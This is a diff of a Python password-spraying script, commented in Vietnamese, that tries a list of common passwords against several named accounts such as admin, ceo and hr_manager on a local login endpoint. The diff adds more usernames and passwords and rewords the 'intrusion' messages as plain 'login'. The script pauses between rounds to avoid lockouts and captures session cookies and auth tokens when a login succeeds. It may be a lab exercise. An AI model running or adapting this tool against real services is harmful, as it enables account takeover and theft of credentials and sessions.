@@ -6,12 +6,13 @@ API_URL = "http://localhost:8000/login"
 
 TARGET_USERS = [
     "admin", "ceo", "hr_manager", "it_support", "nguyenvana", 
-    "tranvib", "lethic", "sale_01", "marketing", "guest"
+    "user", "lethic", "sale_01", "marketing", "guest","abcd"
 ]
 
 COMMON_PASSWORDS = [
     "123456", "password", "123456789", "Admin@123", "12345678", 
-    "111111", "Cong_ty_123", "qwerty", "12345", "Welcome@123"
+    "111111","222222", "user1", "qwerty", "12345", "Welcome@123",
+    "admin", "admin123", "root", "user", "user123", "administrator", "aaaaaa"
 ]
 
 # Chuyển đổi thành Dictionary để lưu cả Tài khoản lẫn Mật khẩu
@@ -49,7 +50,7 @@ for password in COMMON_PASSWORDS:
                 important_headers = {k: v for k, v in response.headers.items() if k.lower() in ['set-cookie', 'authorization', 'x-auth-token']}
                 
                 print("\n" + "🔥"*30)
-                print(f"[+] XÂM NHẬP THÀNH CÔNG TÀI KHOẢN!")
+                print(f"[+] ĐĂNG NHẬP THÀNH CÔNG TÀI KHOẢN!")
                 print(f"    👤 Target User : {user}")
                 print(f"    🔑 Password    : {password}")
                 print(f"    ⏱️ Thời gian   : Ở giây thứ {time_elapsed}")
@@ -68,7 +69,7 @@ for password in COMMON_PASSWORDS:
             print(f"  [!] Lỗi kết nối ({user}): {e.__class__.__name__}")
 
     sleep_time = 3  
-    print(f"\n[*] Đã rải xong mật khẩu '{password}'.")
+    print(f"\n[*] Đã thử xong mật khẩu '{password}'.")
     print(f"[*] Chờ {sleep_time} giây...")
     time.sleep(sleep_time)
 
